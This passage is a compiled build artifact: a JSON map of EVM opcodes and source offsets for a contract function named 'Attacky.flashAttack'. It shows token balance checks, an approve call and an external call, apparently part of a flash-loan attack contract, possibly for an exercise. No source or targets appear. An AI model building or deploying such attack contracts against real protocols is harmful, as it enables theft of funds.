      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "292": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "294": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP1",
      "path": "14"
    },
    "295": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "RETURNDATACOPY",
      "path": "14"
    },
    "296": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "297": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "299": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "REVERT",
      "path": "14"
    },
    "300": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "301": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "POP",
      "path": "14"
    },
    "302": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "POP",
      "path": "14"
    },
    "303": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "POP",
      "path": "14"
    },
    "304": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "POP",
      "path": "14"
    },
    "305": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "307": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "308": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "309": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "311": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "NOT",
      "path": "14"
    },
    "312": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "314": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP3",
      "path": "14"
    },
    "315": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ADD",
      "path": "14"
    },
    "316": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "AND",
      "path": "14"
    },
    "317": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP3",
      "path": "14"
    },
    "318": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ADD",
      "path": "14"
    },
    "319": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP1",
      "path": "14"
    },
    "320": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "322": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "323": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "POP",
      "path": "14"
    },
    "324": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "DUP2",
      "path": "14"
    },
    "325": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "ADD",
      "path": "14"
    },
    "326": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "327": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x150"
    },
    "330": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "331": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "332": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x58A"
    },
    "335": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        783,
        814
      ],
      "op": "JUMP",
      "path": "14"
    },
    "336": {
      "fn": "Attacky.flashAttack",
      "offset": [
        783,
        814
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "337": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        758
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x520"
    },
    "340": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        747,
        815
      ],
      "op": "JUMP",
      "path": "14"
    },
    "341": {
      "fn": "Attacky.flashAttack",
      "offset": [
        747,
        815
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "342": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "344": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "345": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "350": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "352": {
      "op": "SHL"
    },
    "353": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP2",
      "path": "14"
    },
    "354": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "355": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "357": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "359": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "361": {
      "op": "SHL"
    },
    "362": {
      "op": "SUB"
    },
    "363": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1049,
        1053
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "396": {
      "op": "DUP2"
    },
    "397": {
      "op": "AND"
    },
    "398": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "400": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP4",
      "path": "14"
    },
    "401": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ADD",
      "path": "14"
    },
    "402": {
      "op": "MSTORE"
    },
    "403": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "405": {
      "op": "SWAP2"
    },
    "406": {
      "fn": "Attacky.flashAttack",
      "offset": [
        880,
        884
      ],
      "op": "ADDRESS",
      "path": "14"
    },
    "407": {
      "fn": "Attacky.flashAttack",
      "offset": [
        880,
        884
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "408": {
      "fn": "Attacky.flashAttack",
      "offset": [
        920,
        926
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "441": {
      "fn": "Attacky.flashAttack",
      "offset": [
        920,
        926
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "442": {
      "op": "DUP5"
    },
    "443": {
      "op": "SWAP2"
    },
    "444": {
      "fn": "Attacky.flashAttack",
      "offset": [
        880,
        884
      ],
      "op": "DUP5",
      "path": "14"
    },
    "445": {
      "fn": "Attacky.flashAttack",
      "offset": [
        880,
        884
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "446": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "447": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "DUP5",
      "path": "14"
    },
    "448": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "AND",
      "path": "14"
    },
    "449": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "450": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x70A08231"
    },
    "455": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1040
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "456": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "458": {
      "op": "ADD"
    },
    "459": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "461": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "463": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "464": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP1",
      "path": "14"
    },
    "465": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP4",
      "path": "14"
    },
    "466": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "SUB",
      "path": "14"
    },
    "467": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP2",
      "path": "14"
    },
    "468": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP7",
      "path": "14"
    },
    "469": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "GAS",
      "path": "14"
    },
    "470": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "STATICCALL",
      "path": "14"
    },
    "471": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "472": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP1",
      "path": "14"
    },
    "473": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "474": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x1E7"
    },
    "477": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "478": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "479": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "481": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP1",
      "path": "14"
    },
    "482": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "RETURNDATACOPY",
      "path": "14"
    },
    "483": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "484": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "486": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "REVERT",
      "path": "14"
    },
    "487": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "488": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "POP",
      "path": "14"
    },
    "489": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "POP",
      "path": "14"
    },
    "490": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "POP",
      "path": "14"
    },
    "491": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "POP",
      "path": "14"
    },
    "492": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "494": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "495": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "496": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "498": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "NOT",
      "path": "14"
    },
    "499": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x1F"
    },
    "501": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP3",
      "path": "14"
    },
    "502": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ADD",
      "path": "14"
    },
    "503": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "AND",
      "path": "14"
    },
    "504": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP3",
      "path": "14"
    },
    "505": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ADD",
      "path": "14"
    },
    "506": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP1",
      "path": "14"
    },
    "507": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "509": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "510": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "POP",
      "path": "14"
    },
    "511": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "DUP2",
      "path": "14"
    },
    "512": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "ADD",
      "path": "14"
    },
    "513": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "514": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x20B"
    },
    "517": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "518": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "519": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x58A"
    },
    "522": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        1024,
        1055
      ],
      "op": "JUMP",
      "path": "14"
    },
    "523": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1024,
        1055
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "524": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "526": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "527": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "529": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "531": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "533": {
      "op": "SHL"
    },
    "534": {
      "op": "SUB"
    },
    "535": {
      "op": "SWAP1"
    },
    "536": {
      "op": "SWAP3"
    },
    "537": {
      "op": "AND"
    },
    "538": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x24"
    },
    "540": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP4",
      "path": "14"
    },
    "541": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "ADD",
      "path": "14"
    },
    "542": {
      "op": "MSTORE"
    },
    "543": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "545": {
      "op": "DUP3"
    },
    "546": {
      "op": "ADD"
    },
    "547": {
      "op": "MSTORE"
    },
    "548": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "550": {
      "op": "ADD"
    },
    "551": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "553": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP1",
      "path": "14"
    },
    "554": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "555": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "557": {
      "op": "NOT"
    },
    "558": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP2",
      "path": "14"
    },
    "559": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP5",
      "path": "14"
    },
    "560": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SUB",
      "path": "14"
    },
    "561": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "ADD",
      "path": "14"
    },
    "562": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP2",
      "path": "14"
    },
    "563": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "564": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "565": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP2",
      "path": "14"
    },
    "566": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "567": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x20"
    },
    "569": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP3",
      "path": "14"
    },
    "570": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "ADD",
      "path": "14"
    },
    "571": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP1",
      "path": "14"
    },
    "572": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "573": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "575": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "577": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "579": {
      "op": "SHL"
    },
    "580": {
      "op": "SUB"
    },
    "581": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "AND",
      "path": "14"
    },
    "582": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "587": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "589": {
      "op": "SHL"
    },
    "590": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "OR",
      "path": "14"
    },
    "591": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "592": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "593": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "MLOAD",
      "path": "14",
      "statement": 1
    },
    "594": {
      "op": "PUSH4",
      "value": "0x3E5A95A3"
    },
    "599": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "601": {
      "op": "SHL"
    },
    "602": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP2",
      "path": "14"
    },
    "603": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "MSTORE",
      "path": "14"
    },
    "604": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "605": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SWAP2",
      "path": "14"
    },
    "606": {
      "op": "POP"
    },
    "607": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "609": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "611": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "613": {
      "op": "SHL"
    },
    "614": {
      "op": "SUB"
    },
    "615": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1070
      ],
      "op": "PUSH32",
      "path": "14",
      "value": "0x0"
    },
    "648": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1087
      ],
      "op": "AND",
      "path": "14"
    },
    "649": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1087
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "650": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1087
      ],
      "op": "PUSH4",
      "path": "14",
      "value": "0x3E5A95A3"
    },
    "655": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1087
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "656": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x2A3"
    },
    "659": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "660": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1088,
        1094
      ],
      "op": "DUP8",
      "path": "14"
    },
    "661": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1088,
        1094
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "662": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1096,
        1104
      ],
      "op": "DUP8",
      "path": "14"
    },
    "663": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1096,
        1104
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "664": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1106,
        1112
      ],
      "op": "DUP8",
      "path": "14"
    },
    "665": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1106,
        1112
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "666": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "DUP8",
      "path": "14"
    },
    "667": {
      "fn": "Attacky.flashAttack",
      "offset": [
        957,
        1056
      ],
      "op": "SWAP1",
      "path": "14"
    },
    "668": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x4"
    },
    "670": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "ADD",
      "path": "14"
    },
    "671": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x5E9"
    },
    "674": {
      "fn": "Attacky.flashAttack",
      "jump": "i",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMP",
      "path": "14"
    },
    "675": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "676": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "678": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x40"
    },
    "680": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "681": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "682": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP4",
      "path": "14"
    },
    "683": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "SUB",
      "path": "14"
    },
    "684": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP2",
      "path": "14"
    },
    "685": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "687": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP8",
      "path": "14"
    },
    "688": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "689": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "EXTCODESIZE",
      "path": "14"
    },
    "690": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "691": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "692": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "693": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x2BD"
    },
    "696": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "697": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "699": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "700": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "REVERT",
      "path": "14"
    },
    "701": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "702": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "POP",
      "path": "14"
    },
    "703": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "GAS",
      "path": "14"
    },
    "704": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "CALL",
      "path": "14"
    },
    "705": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "706": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "707": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "ISZERO",
      "path": "14"
    },
    "708": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH2",
      "path": "14",
      "value": "0x2D1"
    },
    "711": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMPI",
      "path": "14"
    },
    "712": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "713": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "715": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "DUP1",
      "path": "14"
    },
    "716": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "RETURNDATACOPY",
      "path": "14"
    },
    "717": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "RETURNDATASIZE",
      "path": "14"
    },
    "718": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "PUSH1",
      "path": "14",
      "value": "0x0"
    },
    "720": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "REVERT",
      "path": "14"
    },
    "721": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1066,
        1119
      ],
      "op": "JUMPDEST",
      "path": "14"
    },
    "722": {
      "op": "POP"
    },
    "723": {
      "op": "POP"
    },
    "724": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "PUSH1",
      "path": "14",
      "statement": 2,
      "value": "0x40"
    },
    "726": {
      "fn": "Attacky.flashAttack",
      "offset": [
        1186,
        1217
      ],
      "op": "MLOAD",
      "path": "14"
    },
    "727": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "732": {
      "op": "PUSH1",
      "value": "0xE0"
